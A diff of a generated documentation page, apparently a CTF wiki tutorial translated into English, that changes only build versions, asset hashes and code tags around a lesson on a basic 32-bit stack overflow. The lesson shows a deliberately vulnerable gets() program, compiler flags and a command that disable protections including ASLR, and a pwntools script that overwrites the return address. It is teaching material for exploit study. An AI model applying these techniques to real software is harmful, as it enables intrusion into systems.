@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4697,7 +4697,7 @@
 </ul>
 <h2 id="basic-example">Basic example<a class="headerlink" href="#basic-example" title="Permanent link">&para;</a></h2>
 <p>The most typical stack overflow exploit is to cover the return address of the program to the address controlled by the attacker. <strong> Of course, you need to ensure that the segment where the address is located has executable permissions</strong>. Below, we give a simple example:</p>
-<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 
 <span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
 
@@ -4722,11 +4722,11 @@
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>The main purpose of this program is to read a string and output it. <strong>We want to control the program to execute the success function. </strong></p>
 <p>We compile it with the following command</p>
-<div class="codehilite"><pre><span></span>➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
+<div class="codehilite"><pre><span></span><code>➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
 
 stack_example.c: In <span class="k">function</span> ‘vulnerable’:
 
@@ -4738,14 +4738,14 @@ stack_example.c:6:3: warning: implicit declaration of <span class="k">function</
 
 /tmp/ccPU8rRA.o: In the <span class="k">function</span> <span class="p">&amp;</span><span class="c1">#39;vulnerable&amp;#39;:</span>
 stack_example.c:<span class="o">(</span>.text+0x27<span class="o">)</span>: 警告： the <span class="sb">`</span>gets<span class="err">&#39;</span> <span class="k">function</span> is dangerous and should not be used.
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that gets itself is a dangerous function. It never checks the length of the input string, but uses Enter to determine if the input is over, so it can easily cause the stack to overflow.</p>
 <p>&gt; Historically, the <strong>Morris worm</strong> first worm exploited the dangerous function get to implement stack overflow.</p>
 <p>In the gcc compiler directive, <code>-m32</code> refers to the generation of a 32-bit program; <code>-fno-stack-protector</code> refers to the stack overflow protection not being turned on, that is, no canary is generated.
 In addition, in order to introduce the basic use of stack overflow more conveniently, it is also necessary to disable PIE (Position Independent Executable) to avoid the disruption of the load base address. Different gcc versions have different default configurations for PIE. We can use the command <code>gcc -v</code> to view the default gcc switch status. If the <code>--enable-default-pie</code> parameter is present, it means that the PIE is enabled by default. You need to add the parameter <code>-no-pie</code> to the compile directive.</p>
 <p>After compiling successfully, you can check the compiled file with the checksec tool:</p>
-<div class="codehilite"><pre><span></span>➜  stack-example checksec stack_example
+<div class="codehilite"><pre><span></span><code>➜  stack-example checksec stack_example
 
     Arch:     i386-32-little
 
@@ -4756,7 +4756,7 @@ In addition, in order to introduce the basic use of stack overflow more convenie
     NX:       NX enabled
 
     PIE:      No PIE (0x8048000)
-</pre></div>
+</code></pre></div>
 
 <p>Referring to the PIE protection at compile time, there is also a mechanism for Address Space Distribution Randomization (ASLR) under the Linux platform. Simply put, even if the executable file has PIE protection enabled, you need to enable ASLR to actually disturb the base address. Otherwise, the program will still load a fixed base address (but not the base address of No PIE). We can control the ASLR startup by modifying <code>/proc/sys/kernel/randomize_va_space</code>. The specific options are</p>
 <ul>
@@ -4767,7 +4767,7 @@ In addition, in order to introduce the basic use of stack overflow more convenie
 <p>We can use the <code>echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space</code> to turn off the ASLR of the Linux system. Similarly, you can configure the corresponding parameters.</p>
 <p>In order to reduce the complexity of subsequent exploits, we close ASLR here and close PIE at compile time. Of course, readers can also try different combinations of ASLR and PIE switches, and use IDA and its dynamic debugging function to observe the program address change (can also be successfully attacked when ASLR is closed and PIE is enabled).</p>
 <p>After confirming that the stack overflow and PIE protection are turned off, we use IDA to decompile the binary and view the vulnerable function. can be seen</p>
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">vulnerable</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">vulnerable</span><span class="p">()</span>
 
 <span class="p">{</span>
 
@@ -4780,10 +4780,10 @@ In addition, in order to introduce the basic use of stack overflow more convenie
   <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>The length of the string distance ebp is 0x14, then the corresponding stack structure is</p>
-<div class="codehilite"><pre><span></span>                                           +-----------------+
+<div class="codehilite"><pre><span></span><code>                                           +-----------------+
 
 | retaddr |
                                            +-----------------+
@@ -4805,7 +4805,7 @@ In addition, in order to introduce the basic use of stack overflow more convenie
                                            |                 |
 
                               s,ebp-0x14--&gt;+-----------------+
-</pre></div>
+</code></pre></div>
 
 <p>And, we can get the address of success through IDA, its address is 0x0804843B.</p>
 <p><code>`</code>asm
@@ -4821,11 +4821,11 @@ In addition, in order to introduce the basic use of stack overflow more convenie
 .text:08048452                 leave</p>
 <p>.text: 08048453 retn
 .text:08048453 success         endp</p>
-<div class="codehilite"><pre><span></span>Then if we read the string is
-</pre></div>
+<div class="codehilite"><pre><span></span><code>Then if we read the string is
+</code></pre></div>
 
 <p>0x14*'a'+'bbbb'+success_addr</p>
-<div class="codehilite"><pre><span></span>Then, since gets will read the carriage return, we can directly read all the strings, and cover the saved ebp to bbbb and the retaddr to success_addr. That is, the stack structure at this time is
+<div class="codehilite"><pre><span></span><code>Then, since gets will read the carriage return, we can directly read all the strings, and cover the saved ebp to bbbb and the retaddr to success_addr. That is, the stack structure at this time is
 
 
 ```text
@@ -4851,14 +4851,14 @@ In addition, in order to introduce the basic use of stack overflow more convenie
                                            |                 |
 
                               s,ebp-0x14--&gt;+-----------------+
-</pre></div>
+</code></pre></div>
 
 <p>However, it should be noted that since in the computer&#39;s memory, each value is stored in bytes. In general, small-end storage is used, that is, the form of 0x0804843B in memory is</p>
-<div class="codehilite"><pre><span></span>\x3b\x84\x04\x08
-</pre></div>
+<div class="codehilite"><pre><span></span><code>\x3b\x84\x04\x08
+</code></pre></div>
 
 <p>However, we can&#39;t input these characters directly in the terminal. When the terminal inputs, \, x, etc. also count as a single character. . So we need to find a way to enter \x3b as a character. So at this point we need to use a wave of pwntools (about how to install and basic usage, please github), here the code using pwntools is as follows:</p>
-<div class="codehilite"><pre><span></span><span class="c1">##coding=utf8</span>
+<div class="codehilite"><pre><span></span><code><span class="c1">##coding=utf8</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -4877,10 +4877,10 @@ In addition, in order to introduce the basic use of stack overflow more convenie
 
 <span class="c1">## Convert code interaction to manual interaction</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>Execute a wave of code to get</p>
-<div class="codehilite"><pre><span></span>➜  stack-example python exp.py
+<div class="codehilite"><pre><span></span><code>➜  stack-example python exp.py
 
 <span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./stack_example&#39;</span>: pid <span class="m">61936</span>
 
@@ -4897,7 +4897,7 @@ $
 <span class="o">[</span>*<span class="o">]</span> Process <span class="s1">&#39;./stack_example&#39;</span> stopped with <span class="nb">exit</span> code -11 <span class="o">(</span>SIGSEGV<span class="o">)</span> <span class="o">(</span>pid <span class="m">61936</span><span class="o">)</span>
 
 <span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> sending in interactive
-</pre></div>
+</code></pre></div>
 
 <p>You can see that we have indeed executed the success function.</p>
 <h2 id="_1">小述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
@@ -5014,7 +5014,7 @@ $
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5029,7 +5029,7 @@ $
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
